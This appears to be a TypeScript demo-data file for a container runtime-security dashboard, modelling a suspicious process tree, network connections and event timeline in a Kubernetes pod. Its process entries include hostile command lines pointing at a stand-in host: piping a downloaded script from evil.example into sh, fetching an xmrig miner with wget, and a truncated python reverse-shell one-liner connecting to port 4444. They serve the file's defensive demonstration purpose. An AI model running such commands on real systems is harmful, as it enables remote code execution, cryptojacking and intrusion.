export type ProcessNode = {
  id: string;
  pid: number;
  ppid: number;
  binary: string;
  role: "entry" | "shell" | "tool" | "suspect";
  cmdline: string;
};

export type NetEdge = {
  id: string;
  fromPid: number;
  dst: string;
  port: number;
  proto: string;
  label: string;
};

export type ActivityEvent = {
  id: string;
  t: string;
  type: string;
  pid: number;
  summary: string;
};

export const POD = "web-frontend-7d9c4f8b9-xk2m1";
export const NAMESPACE = "default";

/** Demo: reverse-shell-ish chain from Runtime Radar style events */
export const processes: ProcessNode[] = [
  {
    id: "p1",
    pid: 1,
    ppid: 0,
    binary: "/bin/bash",
    role: "entry",
    cmdline: "/bin/bash -c entrypoint.sh",
  },
  {
    id: "p2",
    pid: 42,
    ppid: 1,
    binary: "/usr/sbin/nginx",
    role: "tool",
    cmdline: "nginx: master process",
  },
  {
    id: "p3",
    pid: 128,
    ppid: 1,
    binary: "/bin/sh",
    role: "shell",
    cmdline: "sh -c curl http://evil.example/payload.sh | sh",
  },
  {
    id: "p4",
    pid: 140,
    ppid: 128,
    binary: "/usr/bin/curl",
    role: "tool",
    cmdline: "curl -fsSL http://evil.example/payload.sh",
  },
  {
    id: "p5",
    pid: 141,
    ppid: 128,
    binary: "/bin/sh",
    role: "suspect",
    cmdline: "sh /tmp/payload.sh",
  },
  {
    id: "p6",
    pid: 155,
    ppid: 141,
    binary: "/usr/bin/python3",
    role: "suspect",
    cmdline: "python3 -c import socket,os,pty; ...",
  },
  {
    id: "p7",
    pid: 162,
    ppid: 141,
    binary: "/usr/bin/wget",
    role: "suspect",
    cmdline: "wget http://evil.example/xmrig -O /tmp/x",
  },
];

export const netEdges: NetEdge[] = [
  {
    id: "n1",
    fromPid: 140,
    dst: "evil.example",
    port: 80,
    proto: "tcp",
    label: "download",
  },
  {
    id: "n2",
    fromPid: 155,
    dst: "45.33.12.9",
    port: 4444,
    proto: "tcp",
    label: "reverse-shell",
  },
  {
    id: "n3",
    fromPid: 162,
    dst: "evil.example",
    port: 80,
    proto: "tcp",
    label: "miner-fetch",
  },
  {
    id: "n4",
    fromPid: 42,
    dst: "10.96.0.1",
    port: 443,
    proto: "tcp",
    label: "k8s-api",
  },
];

export const events: ActivityEvent[] = [
  {
    id: "e1",
    t: "20:01:02",
    type: "PROCESS_EXEC",
    pid: 1,
    summary: "entrypoint /bin/bash",
  },
  {
    id: "e2",
    t: "20:01:03",
    type: "PROCESS_EXEC",
    pid: 42,
    summary: "nginx master started",
  },
  {
    id: "e3",
    t: "20:04:11",
    type: "PROCESS_EXEC",
    pid: 128,
    summary: "interactive /bin/sh in container",
  },
  {
    id: "e4",
    t: "20:04:12",
    type: "PROCESS_KPROBE",
    pid: 140,
    summary: "curl → evil.example:80",
  },
  {
    id: "e5",
    t: "20:04:13",
    type: "PROCESS_EXEC",
    pid: 141,
    summary: "payload.sh executed",
  },
  {
    id: "e6",
    t: "20:04:14",
    type: "PROCESS_KPROBE",
    pid: 155,
    summary: "python reverse connect :4444",
  },
  {
    id: "e7",
    t: "20:04:16",
    type: "PROCESS_EXEC",
    pid: 162,
    summary: "wget miner binary",
  },
];
